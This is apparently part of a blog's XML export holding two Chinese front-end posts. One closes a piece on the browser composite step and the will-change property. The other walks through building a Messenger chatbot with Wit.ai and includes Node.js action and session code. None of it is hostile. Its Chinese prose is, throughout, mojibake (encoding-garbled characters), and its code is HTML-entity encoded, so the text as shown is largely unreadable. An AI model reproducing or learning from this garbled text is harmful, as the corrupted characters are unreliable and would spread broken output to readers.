Compositeåœ¨ä¸€å€‹ç¶²é çš„é é¢ç•¶ä¸­ï¼Œå¯¦éš›ä¸Šä¸¦éæ˜¯å¹³é¢çš„ï¼Œé€šå¸¸æœƒç”±è¨±å¤šLayeræ‰€çµ„æˆï¼Œè€Œåœ¨Browser rendering pipelineçš„æœ€å¾Œä¸€å€‹æ­¥é©ŸCompositeä¸­ï¼Œå°±æ˜¯è² è²¬å°‡é€™äº›Layerçµ„åˆæˆå®Œæ•´çš„é é¢ã€‚
æˆ‘å€‘é€™æ¬¡ä»¥æœ€è¿‘Liveç›´æ’­çµ±ä¸€ç…é —ç‚ºç†±é–€çš„Yahooé¦–é ç‚ºä¾‹å­ï¼Œä¾ç…§å…ˆå‰çš„æ–¹å¼æ‰“é–‹Dev toolä¸­çš„Timelineï¼Œé¸å–å…¶ä¸­ä¸€æ®µframeå¾Œï¼Œé»é¸ä¸‹æ–¹çš„Layersæ¨™ç±¤ï¼Œæ‡‰è©²å°±å¯ä»¥çœ‹åˆ°é¡ä¼¼ä¸‹é¢çš„åœ–ï¼š
å¯ä»¥ç™¼ç¾yahooé¦–é ä¹Ÿæ˜¯ç”±è¨±å¤šå±¤Layeræ‰€çµ„æˆã€‚
çœ¼å°–çš„è®€è€…å¯èƒ½æœƒç™¼ç¾ç‚ºä»€éº¼é é¢ä¸­åªæœ‰ä¸€å€‹å€å¡Šæ˜¯ç¶ è‰²çš„ï¼Ÿé€™å°±æ˜¯é€™å°ç¯€çš„é‡é»äº†ï¼Œåœ¨Compositeçš„éç¨‹ä¸­ï¼Œåªæœ‰éœ€è¦é‡æ–°Styleèˆ‡Layoutçš„Layeræ‰éœ€è¦é‡ç¹ªï¼Œè€Œé€™äº›éœ€è¦é‡ç¹ªçš„Layerå°±æœƒè¢«æ¨™è¨»æˆç¶ è‰²ï¼›ä»¥yahooé¦–é ç‚ºä¾‹ï¼Œç¶ è‰²çš„é‚£æ¢æ˜¯å½±éŸ³åˆ—è¡¨ï¼Œç†ç•¶æœƒä¸æ–·è®Šå‹•ï¼Œå› æ­¤æœƒè¢«Highlightç‚ºç¶ è‰²ã€‚
é‚£ç‚ºä»€éº¼æˆ‘å€‘éœ€è¦é‡å°é€™å€‹æ­¥é©ŸåšOptimizeå‘¢ï¼Ÿå› ç‚ºå‡å¦‚åœ¨åŒä¸€å±¤layerä¸­ï¼Œä½ å…¶å¯¦åªæœ‰æŸä¸€å€‹divéœ€è¦re-layoutï¼Œä½†ç”±æ–¼æ˜¯åœ¨åŒä¸€å€‹Layerï¼Œæœƒè®Šæˆæ•´å€‹Layeréƒ½éœ€è¦é‡æ–°ç¹ªè£½ï¼Œå¦‚æ­¤ä¸€ä¾†å°±æœƒå¢åŠ ä¸å¿…è¦çš„è² æ“”ã€‚
å› æ­¤æˆ‘å€‘å¯ä»¥åœ¨ä½ ç¢ºå®šæœƒéœ€è¦é‡ç¹ªåˆ¶çš„divä¸­ï¼ŒåŠ å…¥will-change: transform;é€™å€‹å±¬æ€§ï¼Œå‘Šè¨´browserèªªï¼Œâ€œæ¬¸~æˆ‘çŸ¥é“æˆ‘å¯èƒ½æœƒè®Šå‹•å–”ï¼Œè«‹ä¸è¦æŠŠå¤§å®¶è·Ÿæˆ‘è¦–ç‚ºä¸€æ¨£çš„â€ï¼Œé€™æ¨£å°±èƒ½è§£æ±ºä¸Šè¿°çš„å•é¡Œã€‚
å¤§å®¶ä¸å¦¨æ‰“é–‹è‡ªå·±çš„ç¶²ç«™ï¼Œåˆ©ç”¨Chromeçš„Timelineç©çœ‹çœ‹ï¼Œæå‡é é¢çš„æ¸²æŸ“æ•ˆç‡ï¼Œè®“æˆ‘å€‘ä¸€èµ·è¿½æ±‚60psçš„æ¥µè‡´å¿«æ„Ÿå§ï¼
å»¶ä¼¸é–±è®€
How not to trigger layout in webkit
Google Web Fundamentals
Accelerated Rendering in Chrome

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>Browser Rendering Optimization</tag>
        <tag>frontend</tag>
        <tag>web</tag>
        <tag>web performance</tag>
        <tag>ç¶²é æ•ˆèƒ½</tag>
        <tag>ç¶²ç«™æ•ˆèƒ½</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆ©ç”¨ Wit.ai è®“ä½ çš„ Messenger Bot æ›´è°æ˜ï¼</title>
    <url>/2016/07/02/ChatBot-with-Wit/</url>
    <content><![CDATA[ä»Šå¤©æˆ‘å€‘è¦è®“æˆ‘å€‘çš„ Chat Bot æ›´åŠ è°æ˜ï¼Œåˆ©ç”¨è¢« Facebook æ”¶è³¼çš„ Wit.ai æ‰€æä¾›ä¹‹ APIï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„è®“ Chat Bot æœ‰äº† NLP çš„æ”¯æ´ï¼Œè®“ä»–&#x2F;å¥¹æ›´åŠ è°æ˜ï¼
å¯¦éš›ä¸Š Wit.ai çš„ä»‹é¢ä¸¦æ²’æœ‰æˆ‘æƒ³åƒä¸­çš„å¥½ç”¨ï¼Œéœ€è¦å¾ˆæœ‰è€å¿ƒåœ°æŠŠå®˜ç¶²ä¸Šçš„æ•™å­¸ä¸€æ­¥æ­¥åšå®Œï¼Œä¸¦ä¸”äº†è§£ä»–æ‰€å®šç¾©çš„åè©ä»£è¡¨ä¹‹å«ç¾©ï¼Œé›–ç„¶å¯«å¾—å¾ˆè©³ç´°ï¼Œä½†ç•¢ç«Ÿæ˜¯è‹±æ–‡ï¼Œå› æ­¤å°±è¨˜éŒ„ä¸€ä¸‹æ•´å€‹éç¨‹ï¼Œä¸¦è·Ÿå¤§å®¶åˆ†äº«ã€‚

Step 1 è¨»å†Š Wit.ai å¸³è™Ÿå…ˆåˆ° Wit.ai çš„å®˜æ–¹ç¶²ç«™è¨»å†Šä¸€å€‹å¸³è™Ÿï¼Œæœ‰ GitHub èˆ‡ Facebook å¯ä»¥é¸æ“‡ã€‚

Step 2 Dashboard è¨­å®šæ¥è‘—ä½ æœƒé€²åˆ°ä½ çš„ Dashboard

é»é¸å³ä¸Šè§’çš„ + è™Ÿï¼Œé€²å…¥ App è¨­å®šé é¢ï¼Œé€²è¡Œç°¡å–®çš„è¨­å®šï¼ŒåŸºæœ¬ä¸Šåªè¦è¨­å®š åå­— èˆ‡ æè¿°ï¼Œèªè¨€ç­‰ç­‰ä¹‹å¾Œé‚„èƒ½ä¿®æ”¹ã€‚é€™é‚Šè¦æä¸€ä¸‹ï¼Œæˆ‘æœ¬ä¾†æƒ³è¨­å®šæˆ Chineseï¼Œä½†å¾Œä¾†åœ¨å»ºç«‹æ©Ÿå™¨äººå°è©±æ•…äº‹æ™‚ï¼Œç™¼ç¾ä»–çš„ä¸­æ–‡æ”¯æ´å¥½åƒé‚„ä¸æ˜¯å¾ˆå®Œå–„ï¼Œå¸¸å¸¸åˆ¤æ–·ä¸å‡º Entityï¼Œå› æ­¤é€™é‚Šé‚„æ˜¯å…ˆä»¥è‹±æ–‡ç‚ºä¾‹å­ï¼Œå¦‚æœæœ‰é«˜æ‰‹çŸ¥é“æ€éº¼è§£çš„è©±ä¹Ÿæ­¡è¿å‘Šè¨´æˆ‘ï¼

Step 3 å‰µå»ºå°è©±æƒ…å¢ƒ (Story)ç¹¼çºŒï¼Œè¨­å®šå®Œå¾Œå°±é€²å…¥åˆ°ç·¨è¼¯ç•Œé¢ï¼Œåœ¨ Wit.ai è£¡é¢ï¼Œä½ çš„æ©Ÿå™¨äººèˆ‡ä¸€èˆ¬ä½¿ç”¨è€…çš„å°è©±æƒ…å¢ƒï¼Œéƒ½å«åš Storyï¼Œä½ å¯ä»¥é€éå‰µå»º Story ä¾†å®šç¾©å‡ºåœ¨é€™å€‹æƒ…å¢ƒä¸‹ï¼Œä½ çš„æ©Ÿå™¨äººè¦æ€éº¼è·Ÿä½¿ç”¨è€…å°è©±ã€‚

æ•´å€‹ä»‹é¢å°±åƒæ˜¯ä¸€å€‹å°è©±è¦–çª—ï¼Œçœ‹èµ·ä¾†é —è¦ªåˆ‡ï¼Œå·¦é‚Šæ˜¯ User saysï¼Œå³é‚Šæ˜¯ Bot sends, Box executes èˆ‡ Jumpã€‚å…ˆç°¡å–®ä»‹ç´¹ï¼Œçœ‹å®Œå¾Œé¢çš„ä¾‹å­æœƒæ›´æ¸…æ¥šã€‚

User saysï¼š é¡§åæ€ç¾©å°±æ˜¯å®šç¾© User æœƒèªªçš„è©±ï¼Œä¸¦ä¸”ä½ å¯ä»¥è¨­å®š User çš„å¥å­ä¸­ï¼Œæœ‰å“ªäº›é—œéµå­—æ˜¯ä½ éœ€è¦çš„ã€å“ªäº›æ–‡å­—æ˜¯ä»£è¡¨ä»€éº¼å«æ„ï¼Œåœ¨ Wit.ai çš„ä¸–ç•Œä¸­ï¼Œé€™æ¨£çš„æ±è¥¿å«åš Entityï¼Œå¾Œé¢æœƒå†åº¦èªªæ˜ã€‚

Bot sendsï¼š å°±æ˜¯æ©Ÿå™¨äººè¦å›è¦†çš„å¥å­ï¼Œé€™é‚Šå¯ä»¥å¸¶å…¥ä¸€äº›åƒæ•¸ï¼Œåƒæ˜¯ user æ‰€æåŠçš„ä¸€äº›é—œéµå­—ï¼Œæˆ–æ˜¯æ©Ÿå™¨äººå‘å¤–å‘¼å« API æ‰€å¾—åˆ°çš„çµæœã€‚

Box executesï¼š å°±æ˜¯è®“ä½ å®šç¾©æ©Ÿå™¨äººè¦åŸ·è¡Œçš„ functionï¼ŒçœŸæ­£çš„å¯¦ä½œä¸æœƒåœ¨é€™é‚Šï¼Œé€™é‚Šåªæ˜¯å®šç¾©åç¨±ï¼Œä»¥åŠè¦æ¥æ”¶çš„ context èˆ‡ åå›çš„è®Šæ•¸åç¨±ã€‚

Jumpï¼š å‰‡æ˜¯è®“ä½ èƒ½å¤ åœ¨æ»¿è¶³è¨­å®šçš„ä¸€äº›æ¢ä»¶ä¹‹ä¸‹ï¼Œè·³å›åˆ°æŸå€‹ Box executes æˆ–æ˜¯ Box sends çš„æ­¥é©Ÿå»åŸ·è¡Œã€‚


Step 4 å®šç¾©ä½¿ç”¨è€…èªå¥æ¥ä¸‹ä¾†æˆ‘å€‘å…ˆå®šç¾© User å¯èƒ½æœƒå°æˆ‘å€‘çš„æ©Ÿå™¨äººèªªçš„è©±ï¼Œåƒæ˜¯ä½¿ç”¨è€…å¯èƒ½æœƒè·Ÿæ©Ÿå™¨äººæ‰“æ‹›å‘¼ï¼Œæˆ‘å€‘å°±å¯ä»¥åœ¨å°è©±æ¡†çš„ User says è¼¸å…¥ Helloï¼Œä¸¦ä¸” highlight èµ·ä¾†ä»¥å¾Œè¨­å®š Entityï¼ŒEnity åœ¨ Wit.ai è£¡é¢ï¼Œå°±æ˜¯ç”¨ä¾†è®“ç³»çµ±åˆ¤æ–·ä½¿ç”¨è€…è¼¸å…¥å¥å­æ™‚ï¼Œå“ªäº›é—œéµå­—æ˜¯è¦æŠ½å–å‡ºä¾†åšè™•ç†çš„ï¼Œä½ å¯ä»¥ä¾ç…§è©²é—œéµå­—çš„ç‰¹å‹ä¾†è¨­å®šç›¸å°æ‡‰çš„ Entity é¡åˆ¥ã€‚é€™é‚Šæˆ‘å€‘å°±è‡ªå®šç¾©ä¸€å€‹ Entity åç¨±å«åš greetingï¼Œç•¶ç„¶ Wit.ai ä¹Ÿæœ‰è¨±å¤šå…§å»ºå¥½çš„ Entityï¼Œç•¶ä½ é»é¸ Add a new entity æ™‚ï¼Œä»–æœƒæœ‰æç¤ºã€‚

ä½ å¯èƒ½æœƒæƒ³èªªï¼Œæ‰“æ‹›å‘¼åˆä¸æœƒåªèªª Helloï¼Œä½ é€™æ¨£è¨­å®šçš„è©±ï¼Œæˆ‘ç…§ä¹‹å‰æ–¹æ³• hardcode å¯«åœ¨ server side å°±å¥½äº†å‘€ï¼Œè¦ Wit.ai å¹¹éº»ã€‚
Wit.ai ç•¶ç„¶æ²’æœ‰é€™éº¼ç°¡å–®ï¼Œä»‹é¢ä¸Šæ–¹çš„ Tab æ˜¯ä¸æ˜¯æœ‰å€‹å­¸å£«å¸½å¯«è‘— Understandingï¼Ÿ åœ¨é€™å€‹åœ°æ–¹ä½ æœ‰ä¸‰ç¨®æ–¹å¼å¯ä»¥ç”¨ä¾†è¨“ç·´ä½ çš„æ©Ÿå™¨äººï¼š

å¢åŠ ä¾‹å¥ï¼š

åœ¨ä¸Šæ–¹å¯«è‘— Test how your bot understands a sentence çš„åœ°æ–¹è¼¸å…¥æ›´å¤šçš„ä¾‹å¥ï¼Œä¸¦ä¸”å¦‚åŒå‰é¢æ­¥é©Ÿèˆ¬å»å®šç¾© Entityï¼Œé€™é‚Šè¦æ³¨æ„çš„æ˜¯ï¼Œç•¶ä½ è¼¸å…¥å®Œä¾‹å¥å¾Œï¼Œè¨˜å¾—é»é¸ä¸‹æ–¹ç¶ è‰²çš„ Validateï¼Œè®“ Wit.ai å»è¨˜ä½ä½ çš„ä¾‹å¥ã€‚æˆåŠŸçš„è©±å°±æœƒçœ‹åˆ°ä¸‹æ–¹ Entity çš„ Values æ¬„ä½æœƒå¤šå‡ºä½ å‰›å‰›ä¾‹å¥ä¸­æ‰€æŠ“å–åˆ°çš„é—œéµå­—ï¼ˆä»¥ä¸‹åœ–ä¾‹å­ä¾†èªªå°±æ˜¯ Hi ä¹Ÿè¢«æˆ‘å€‘ç´é€² greeting é€™å€‹ entityå…§äº†ï¼Œåªè¦ä¹‹å¾Œ user è¼¸å…¥ Hello æˆ–æ˜¯ Hiï¼Œéƒ½æ˜¯å±¬æ–¼ greetingï¼‰


å¢åŠ  Entity çš„ Keyword èˆ‡ Synonymsï¼š

ä½ ä¹Ÿå¯ä»¥é»é¸ä¸‹æ–¹çš„ Entity åç¨±ï¼Œé€²å»æ‰‹å‹•å¢åŠ é—œéµå­—æˆ–æ˜¯åŒç¾©è©ã€‚é—œéµå­—èˆ‡åŒç¾©è©çš„é—œä¿‚æœ‰é»åƒæ˜¯çˆ¶å­é¡åˆ¥ï¼Œé€™é‚Šèˆ‰å€‹æ¯”è¼ƒæ˜“æ‡‚çš„ä¾‹å­ï¼Œå¦‚ä¸‹åœ–ï¼Œæˆ‘å€‘æœ‰å€‹ Entity å«åš Beerï¼Œåº•ä¸‹çš„ é—œéµå­—æ˜¯ å•¤é…’ èˆ‡ ç´…é…’ï¼Œç•¶ä½¿ç”¨è€…å–Šå‡ºå•¤é…’çš„æ™‚å€™ï¼Œæ©Ÿå™¨äººå°±æœƒçŸ¥é“æ˜¯å±¬æ–¼ Beer é€™å€‹ Entityã€‚
ä½†å•¤é…’æœ‰å¾ˆå¤šç¨®ç¨®é¡ï¼Œæˆ‘å€‘å¯ä»¥åœ¨åŒç¾©è©é€™é‚Šå¢åŠ ï¼šèœ‚èœœå•¤é…’ï¼Œé€™æ¨£ç•¶ä½¿ç”¨è€…è¼¸å…¥ èœ‚èœœå•¤é…’ æ™‚ï¼Œæ©Ÿå™¨äººå°±æœƒåˆ¤æ–·ç›®å‰çš„ Beer Entity çš„ Value ç‚º å•¤é…’ï¼Œè€Œéç´…é…’ã€‚ç›¸åŒçš„ï¼Œæˆ‘å€‘ä¹Ÿå¯ä»¥è¨­å®š è‘¡è„é…’ ç‚º ç´…é…’ çš„åŒç¾©è©ï¼Œè®“ä½¿ç”¨è€…å–Šå‡º è‘¡è„é…’ æ™‚ï¼Œæ©Ÿå™¨äººæœƒåˆ¤æ–·ç‚º ç´…é…’ã€‚
è¦æ³¨æ„çš„æ˜¯ï¼Œæ©Ÿå™¨äººè¨˜ä½çš„ Entity Value æœƒæ˜¯ä»¥ Keyword ç‚ºä¸»ï¼Œä¹Ÿå°±æ˜¯ä½ è¼¸å…¥èœ‚èœœå•¤é…’ï¼Œä½†å°æ©Ÿå™¨äººä¾†èªªï¼Œåµæ¸¬åˆ°çš„ Beer Entityï¼Œå…¶å€¼ç‚º å•¤é…’ï¼Œè€Œéèœ‚èœœå•¤é…’ã€‚


è¨­å®š Entity çš„ Search strategyï¼š

æœ€å¾Œåœ¨è¨­å®š Entity çš„åœ°æ–¹é‚„æœ‰ Search strategy å¯ä»¥é¸æ“‡ï¼Œæ„æ€æ˜¯ä½ å¸Œæœ› Wit.ai è¦æ€éº¼æ¨£å¾å¥å­ä¸­æ‰¾å‡ºé€™å€‹ Entity ã€‚

trait: å¦‚æœä½ æƒ³è¨­å®šçš„ Entity ä¸¦ä¸æ˜¯ç”±å–®ä¸€ä¸€å€‹é—œéµå­—å°±å¯ä»¥åˆ¤æ–·ï¼Œä¹Ÿä¸æ˜¯é å¥å­ä¸­å¹¾å€‹é—œéµå­—æˆ–æ˜¯å­å¥èƒ½å¤ è¾¨åˆ¥ï¼Œè€Œæ˜¯éœ€è¦æ•´å€‹å¥å­ä¾†åˆ¤å®šçš„è©±ï¼Œå°±è¦è¨­å®šæˆ traitï¼Œåƒæ˜¯ä»Šå¤©çš„ä¾‹å­è£¡é¢ï¼Œæƒ³è¦å•æ–°èï¼Œé€™ç¨®ä½¿ç”¨è€…çš„ æ„åœ– å°±å¾ˆé©åˆè¨­å®šæˆ traitã€‚

å®˜ç¶²ç¯„ä¾‹ï¼šå‡ºè™•

free-text: å¦‚æœä½ æƒ³è¦æ“·å–ä½¿ç”¨è€…å¥å­ä¸­çš„æŸæ®µæ–‡å­—ï¼Œè€Œè©²æ®µæ–‡å­—ä¸¦ä¸æ˜¯ç‰¹å®šçš„é—œéµå­—æ™‚ï¼Œå°±è¦è¨­å®š free-textï¼Œåƒæ˜¯ User èªªï¼šâ€œTell Jordan that I will be home in ten minutesâ€ï¼Œè€Œä½ æƒ³è¦æ“·å– â€I will be home in ten miutesâ€ï¼Œé€™æ™‚å°±å¯ä»¥æŠŠæƒ³è¦æ“·å–çš„å¥å­é¸å–èµ·ä¾†ï¼Œè¨­å®šç‚º free-textï¼Œè¦æ³¨æ„çš„æ˜¯ï¼Œfree-text ä¸€å®šè¦æ­é… keywords ä¸€èµ·ä½¿ç”¨ï¼Œæœ‰é»åƒæ˜¯å‘Šè¨´ Wit.ai èªªé€™æ®µè©±éƒ½ç®—æ˜¯ keywordsï¼Œä½†ä¸ä¸€å®šè¦ exactly match æ‰èƒ½è§¸ç™¼ã€‚

å®˜ç¶²ç¯„ä¾‹ï¼šå‡ºè™•

keywords: è¦å®Œå…¨ç¬¦åˆä½ é å…ˆè¨­å®šçš„é—œéµå­—æ‰æœƒè§¸ç™¼ã€‚

å®˜ç¶²ç¯„ä¾‹ï¼šå‡ºè™•

Step 5 å®šç¾©æ©Ÿå™¨äººå›è¦†èªå¥ä»‹ç´¹äº†é€™éº¼å¤šç‘£ç¢çš„æ±è¥¿å¾Œï¼Œå›éé ­ä¾†çœ‹çœ‹æˆ‘å€‘è¦æ€éº¼è¨­å®šæ©Ÿå™¨äººçš„å›è¦†ã€‚ä»¥æœ€å‰é¢çš„ä¾‹å­ä¾†èªªï¼Œç•¶æ©Ÿå™¨äººæ”¶åˆ° greeting çš„ Entity å¾Œï¼Œå¯ä»¥è®“ç”¨ç›¸åŒçš„ entity value å›è¦†ï¼Œä¸¦åŠ ä¸Šç°¡å–®çš„ä»‹ç´¹ã€‚é»é¸ä¸‹æ–¹çš„ Bot sendsï¼Œå°è©±æ¡†å°±æœƒå‡ºç¾æ©Ÿå™¨äººçš„éƒ¨åˆ†ï¼Œä½ å¯ä»¥åœ¨è£¡é¢è¼¸å…¥æ©Ÿå™¨äººçš„å›è¦†èªå¥ï¼Œæƒ³è¦çš„è®Šæ•¸å¯ä»¥ç”¨&#123; &#125;åŒ…èµ·ä¾†ï¼Œé€™é‚Šæˆ‘å€‘ç›´æ¥ä½¿ç”¨ greeting é€™å€‹ entityï¼Œé€™æ¨£å°±èƒ½ç”¨åŒæ¨£çš„ Entity å»å›è¦†ã€‚

ç•«é¢å³ä¸‹æ–¹æœ‰å€‹æµ®å‹•çš„æŒ‰éˆ• â€œPress ~ to chat with your botâ€ï¼Œå¯ä»¥è®“ä½ å³æ™‚æ¸¬è©¦ä¸€ä¸‹ã€‚

Step 6 è¨­å®šæ©Ÿå™¨äººåŸ·è¡Œå‹•ä½œç•¶ç„¶æ©Ÿå™¨äººä¸èƒ½åªå–®ç´”å›è©±ï¼Œè¦èƒ½å¤ åŸ·è¡Œå‹•ä½œï¼Œé€™é‚Šæˆ‘å€‘å‰µå»ºå¦ä¸€å€‹å°è©±æƒ…å¢ƒï¼Œè¨­å®šè®“æˆ‘å€‘çš„æ©Ÿå™¨äººå¹«å¿™æ‰¾æ–°èï¼é€™é‚Šæˆ‘å…ˆè¨­å®šå¥½ä¸€å€‹ä½¿ç”¨è€…èªå¥èˆ‡ç›¸é—œ Entityï¼Œæ¥è‘—å…ˆè®“ Bot executes å‹•ä½œï¼Œä¹Ÿå°±æ˜¯è®“ä»–åŸ·è¡Œä¸€å€‹ Funtionï¼Œé€™é‚Šåªæ˜¯å®šç¾© Function åç¨±ä»¥åŠ è¼¸å‡º çš„åƒæ•¸ï¼Œå¯¦éš›çš„å¯¦ä½œè¦ç­‰åˆ°å¾Œé¢æ’°å¯«ç¨‹å¼æ™‚æ‰éœ€è¦ã€‚

å¾ä¸Šåœ–ä¾†çœ‹ï¼Œæˆ‘è¨­å®šäº†ä¸€å€‹ getNews çš„å‡½å¼ï¼Œä¸¦ä¸”è¨­å®šä¸€å€‹contextç‚º newsResultï¼Œä»£è¡¨é€™å€‹ function æœƒæœ‰ä¸€å€‹è®Šæ•¸ newsResult å¯ä»¥ä¾›å¤–éƒ¨èˆ‡è‡ªå·±ä½¿ç”¨ã€‚æ­¤å¤–ï¼Œæ©Ÿå™¨äººæœƒå…ˆå›è¦†ä¸€å€‹è¨Šæ¯ï¼Œå…¶ä¸­åŒ…å«ä½ çš„ search_query entity ä¹‹ value 
è¨­å®šå®Œä¸€æ¨£è¦é€²è¡Œä¸€ä¸‹æ¸¬è©¦ï¼Œç•¶ä½ è¼¸å…¥ä½¿ç”¨è€…èªå¥å¾Œï¼Œæ©Ÿå™¨äººæœƒåŸ·è¡Œå‡½å¼ï¼Œä¸¦å•ä½ è¦åŸ·è¡Œå“ªå€‹ Contextï¼Œé€™æ™‚ä½ å°±é»é¸å‰›å‰›è¨­å®šçš„ newsResult ç•¶ä½œå›è¦†ï¼Œæ•™å°æ©Ÿå™¨äººè¨˜ä½é€™å€‹ context

è‹¥ä½¿ç”¨è€…æ²’æœ‰èªªä»–æƒ³æ‰¾ä»€éº¼æ–°èæ€éº¼è¾¦å‘¢ï¼Ÿé€™æ™‚å€™å°±æ˜¯å¦ç”¨å¦ä¸€å€‹ Context ä¾†åˆ¤æ–·äº†ï¼ä½ å¯ä»¥è¨­å®šä¸€äº› context branchï¼Œé€é å…ˆå‰æåˆ°çš„ Jump ï¼Œè®“æ©Ÿå™¨äººæ ¹æ“š Context çš„ä¸åŒä¾†åŸ·è¡Œä¸åŒå›è¦†ã€‚é€éå®šç¾©ä¸€å€‹ missNews çš„ Contextï¼Œå‘Šè¨´æ©Ÿå™¨äººï¼Œç•¶æ²’æœ‰ search_query æ™‚ï¼Œå¯ä»¥æ€éº¼åšã€‚
å¦‚ä¸‹åœ–ï¼Œä½ éœ€è¦è¨­å®šä¸€å€‹ BookMark è®“ä½ çš„æ©Ÿå™¨äººå¯ä»¥ Jump åˆ°é‚£å€‹ Contextä¸‹ã€‚

è¨­å®šå®Œå¾Œä¾ç„¶éœ€è¦å…ˆæ¸¬è©¦ä¸€ä¸‹ï¼Œè¨“ç·´ä¸€ä¸‹ä½ çš„ Botã€‚åœ¨é€™é‚Šä½ è¦å‘Šè¨´æ©Ÿå™¨äººç›®å‰æ˜¯å“ªå€‹ Context ã€‚è¦æ³¨æ„çš„æ˜¯ï¼Œä½ å¿…é ˆè¦æŠŠéç•¶ä¸‹å¿…è¦çš„ Context ç§»é™¤ï¼Œåƒæ˜¯ä¸‹åœ–ä¸­ï¼Œåœ¨ User å›ç­” Brexitså¾Œï¼Œéœ€è¦æŠŠ missNews é€™å€‹ context é»é¸æ‰ï¼Œé€™æ¨£ Bot æ‰æœƒæ­£å¸¸çš„è·³å› getNewsã€‚

Step 7 å¥—ç”¨ API èˆ‡å¯¦ä½œ Functionå‰é¢å¹¾å€‹æ­¥é©Ÿåšå®Œå¾Œï¼Œå°±æœ‰å€‹åŸºæœ¬çš„ä½¿ç”¨è€…èˆ‡æ©Ÿå™¨äººäº’å‹•æƒ…å¢ƒï¼Œæ¥ä¸‹ä¾†å°±å¯ä»¥é–‹å§‹å¯¦ä½œå‡½å¼ï¼Œä¸¦å¥—ç”¨ API äº†ã€‚é€™é‚Šä»¥ Node.js ç‚ºä¾‹å­ï¼Œä½ éœ€è¦å…ˆåˆ°ä½ çš„å°ˆæ¡ˆåº•ä¸‹åŠ å…¥ node-wit é€™å€‹ packageã€‚
npm install --save node-wit

ä¹‹å¾Œå¯ä»¥å…ˆæ¸¬è©¦ä¸€ä¸‹ï¼Œä¿®æ”¹å®˜æ–¹çš„ example/quickstart.jsï¼Œå¯¦ä½œå‡º getNews å‡½å¼ï¼Œé€™é‚Šå…ˆç°¡å–® echo ä¸€ä¸‹å°±å¥½ã€‚ç¨‹å¼ç¢¼çŸ­çŸ­çš„ï¼Œä½ éœ€è¦æ³¨æ„çš„æ˜¯ actions é€™å€‹ objectï¼Œè£¡é¢å®šç¾©äº† Bot è¦åŸ·è¡Œçš„å‹•ä½œå‡½å¼ï¼Œsend æ˜¯ç”¨ä¾†è®“ Bot å›è©±çš„ï¼Œé€™ä¸€å®šè¦æœ‰ï¼Œè€Œæˆ‘å€‘è‡ªå·±å®šç¾©çš„ getNews å°±å®šç¾©åœ¨ä¸‹æ–¹ã€‚
getNews è£¡é¢åˆ©ç”¨ firstEntityValue å¾æ¥æ”¶åˆ°çš„ entities ä¸­æ‰¾å‡ºä½ è¦çš„ï¼Œé€™é‚Šæˆ‘å€‘è¦çš„ç•¶ç„¶æ˜¯ search_query çš„å€¼ã€‚æ¥è‘—å°±å¯ä»¥å»é€²è¡Œéœ€è¦çš„è™•ç†ï¼Œå‘¼å« API ç­‰ç­‰ã€‚
å”¯ä¸€è¦æ³¨æ„çš„å°±æ˜¯é€™é‚Šéœ€è¦ä½¿ç”¨ Promise å›å‚³å–”ï¼
const actions = &#123;  send(request, response) &#123;    const &#123;sessionId, context, entities&#125; = request;    const &#123;text, quickreplies&#125; = response;    return new Promise(function(resolve, reject) &#123;      console.log(&#x27;sending...&#x27;, JSON.stringify(response));      return resolve();    &#125;);  &#125;,  getNews(&#123;context, entities&#125;) &#123;    return new Promise(function(resolve, reject) &#123;      var search_query = firstEntityValue(entities, &#x27;search_query&#x27;)      if (search_query) &#123;        context.newsResult = search_query + &#x27;æœ€è¿‘å¾ˆå¤šäººè¨è«–...&#x27; ; // we should call a real API here      &#125; else &#123;        // To-do      &#125;      return resolve(context);    &#125;);  &#125;,&#125;;
åŸ·è¡Œ node example/quickstart.js &lt;Wit.ai server-side Token&gt;å°±æœƒå¾—åˆ°ä»¥ä¸‹çµæœã€‚

åœ¨é€™é‚Šå…ˆæ‰“å²”ä¸€ä¸‹ï¼Œæˆ‘å€‘å›åˆ° Wit.ai çš„ Dashboard çœ‹ä¸€ä¸‹ï¼Œæœƒç™¼ç¾ Inbox ä¸Šé¢æœ‰å€‹å°ç´…é»ï¼ŸWit.ai æœƒåœ¨é€™å€‹åœ°æ–¹ç´€éŒ„ User å‚³é€é€²ä¾†çš„å¥å­ï¼Œä¸¦ä¸”è®“ä½ åœ¨é€™é‚Šæ“ä½œå®ƒï¼Œä¹Ÿå°±æ˜¯èªªï¼Œä½ å¯ä»¥åœ¨é€™é‚Šåˆ©ç”¨ User å‚³å…¥çš„å¥å­ä¾† training ä½ çš„æ©Ÿå™¨äººï¼è®“ä»–ç›´æ¥å¾ä½¿ç”¨è€…èº«ä¸Šå­¸ç¿’ï¼æˆ‘è¦ºå¾—å¾ˆæ£’çš„ä¸€å€‹åŠŸèƒ½ï¼

okï¼Œé¡é ­å†è½‰å›åˆ°ç¨‹å¼ç¢¼ã€‚
å·²ç¶“çŸ¥é“æ€éº¼å¯¦ä½œå‡½å¼äº†ï¼Œé‚£å°±æ¥è‘—æŠŠä»–è·Ÿ Messenger api çµåˆå§ï¼
å…¶å¯¦è·Ÿå‰›å‰›çš„ quickstart.js æ¯”è¼ƒä¸ä¸€æ¨£çš„çš„åœ°æ–¹åœ¨æ–¼ï¼Œä½ å¿…é ˆè¨˜éŒ„èµ·ä¾†æ¯ä¸€å€‹ fb user çš„ sessionï¼Œé€™æ¨£ Wit.ai Bot æ‰æœƒçŸ¥é“è¦å›å‚³çµ¦å“ªå€‹ FB userã€‚
// This will contain all user sessions.// Each session has an entry:// sessionId -&gt; &#123;fbid: facebookUserId, context: sessionState&#125;const sessions = &#123;&#125;;const findOrCreateSession = (fbid) =&gt; &#123;  let sessionId;  // Let&#x27;s see if we already have a session for the user fbid  Object.keys(sessions).forEach(k =&gt; &#123;    if (sessions[k].fbid === fbid) &#123;      // Yep, got it!      sessionId = k;    &#125;  &#125;);  if (!sessionId) &#123;    // No session found for user fbid, let&#x27;s create a new one    sessionId = new Date().toISOString();    sessions[sessionId] = &#123;fbid: fbid, context: &#123;&#125;&#125;;  &#125;  return sessionId;&#125;;

